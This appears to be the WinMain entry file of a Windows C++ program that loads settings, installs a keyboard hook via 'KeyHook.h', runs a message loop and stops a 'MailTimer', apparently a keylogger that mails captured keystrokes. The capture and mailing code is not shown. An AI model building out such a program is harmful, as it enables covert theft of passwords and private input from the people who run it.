#include <windows.h>
#include "KeyHook.h"
#include "Settings.h"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
    if (!Settings::Instance().Load("settings.ini"))
        return -1;

    MSG Msg;

    InstallHook();

    while(GetMessage(&Msg, nullptr, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();

    return 0;
}